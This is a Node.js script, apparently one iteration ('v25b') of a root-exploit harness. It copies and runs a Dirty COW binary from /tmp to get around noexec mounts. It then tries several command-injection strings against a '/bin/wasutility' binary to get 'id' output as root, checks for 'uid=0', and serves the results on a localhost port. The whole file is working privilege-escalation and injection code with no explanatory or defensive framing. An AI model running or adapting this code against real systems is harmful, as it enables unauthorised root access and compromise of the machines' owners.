// v25b - fix noexec: copy dirtycow_was to /tmp, check /proc/mounts, probe wasutility flags
// Pull server: 8105
try {
  var fs  = require('fs');
  var cp  = require('child_process');
  var http = require('http');
  var lines = ['=== dirtycow-lpe v25b ==='];

  var SRC  = '/home/owner/share/tmp/sdk_tools/dirtycow_was';
  var DST  = '/tmp/dirtycow_was';
  var OUT  = '/tmp/pwn_result.txt';

  // Step 1: check /proc/mounts
  try {
    var mounts = fs.readFileSync('/proc/mounts', 'utf8');
    // show relevant lines (writable, tmpfs, etc.)
    var mountLines = mounts.split('\n').filter(function(l){
      return l && (l.indexOf('noexec') !== -1 || l.indexOf('tmpfs') !== -1 ||
                   l.indexOf('/tmp') !== -1 || l.indexOf('home') !== -1);
    });
    lines.push('mounts: ' + JSON.stringify(mountLines));
  } catch(e) { lines.push('mounts: ' + String(e.message)); }

  // Step 2: copy dirtycow_was to /tmp
  try {
    var binData = fs.readFileSync(SRC);
    fs.writeFileSync(DST, binData, {mode: 0755});
    lines.push('copy_to_tmp: OK ' + binData.length + ' bytes');
  } catch(e) { lines.push('copy_to_tmp: ' + String(e.message||e)); }

  // Step 3: chmod +x /tmp/dirtycow_was
  try {
    fs.chmodSync(DST, 0755);
    lines.push('chmod_tmp: OK');
  } catch(e) { lines.push('chmod_tmp: ' + String(e.message)); }

  // Step 4: exec from /tmp
  var dcowOut = '';
  try {
    dcowOut = cp.execSync(DST, {timeout: 45000}).toString().trim();
    lines.push('dirtycow_tmp: OK');
    lines.push('dirtycow_out: ' + dcowOut.substring(0, 200));
  } catch(e) {
    lines.push('dirtycow_tmp: FAILED: ' + String(e.message||e).substring(0, 200));
    if (e.stdout) lines.push('stdout: ' + e.stdout.toString().substring(0, 200));
    if (e.stderr) lines.push('stderr: ' + e.stderr.toString().substring(0, 200));
  }

  // Step 5: probe wasutility - try all likely flags for command execution
  // Options string was: wu:v:a:d:g:f:re:cntps
  // -e takes arg, try different command injection styles
  var cmds = [
    '/bin/wasutility -e "id"',
    '/bin/wasutility -e "id > ' + OUT + '"',
    '/bin/wasutility -e id',
    '/bin/wasutility -c "id"',
    '/bin/wasutility -n "id"',
    '/bin/wasutility',
    // try with subshell to see any output
    '/bin/wasutility -e "/bin/sh -c \\"id > ' + OUT + '\\""',
  ];
  cmds.forEach(function(cmd, i) {
    var r = '';
    try {
      r = cp.execSync(cmd + ' 2>&1', {timeout: 5000}).toString().trim();
      lines.push('cmd[' + i + ']: exit0 out=' + r.substring(0, 80));
    } catch(ex) {
      r = 'exit' + (ex.status||'?') + ' ' + String(ex.stderr||ex.stdout||ex.message||'').substring(0, 80);
      lines.push('cmd[' + i + ']: ' + r);
    }
  });

  // Step 6: check if any output file was written
  try {
    var pwnResult = fs.readFileSync(OUT, 'utf8').trim();
    lines.push('pwn_result: ' + pwnResult);
    if (pwnResult.indexOf('uid=0') !== -1) lines.push('=== ROOTED ===');
  } catch(e) { lines.push('pwn_result: ' + String(e.code||e.message)); }

  // Step 7: check /proc/self/status for our own uid
  try {
    var status = fs.readFileSync('/proc/self/status', 'utf8');
    var uid = status.match(/^Uid:\s+(\S+)/m);
    lines.push('our_uid: ' + (uid ? uid[1] : 'unknown'));
  } catch(e) {}

  var body = lines.join('\n') + '\n=== END ===\n';
  try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe25b.txt', body); } catch(e3) {}
  var srv = http.createServer(function(req, res) {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end(body);
  });
  srv.listen(8105, '127.0.0.1', function() {});
  srv.on('error', function(e) {});
  setInterval(function() {}, 60000);
} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe25b-crash.txt', String(e.stack||e.message).substring(0, 500)); } catch(e2) {}
}
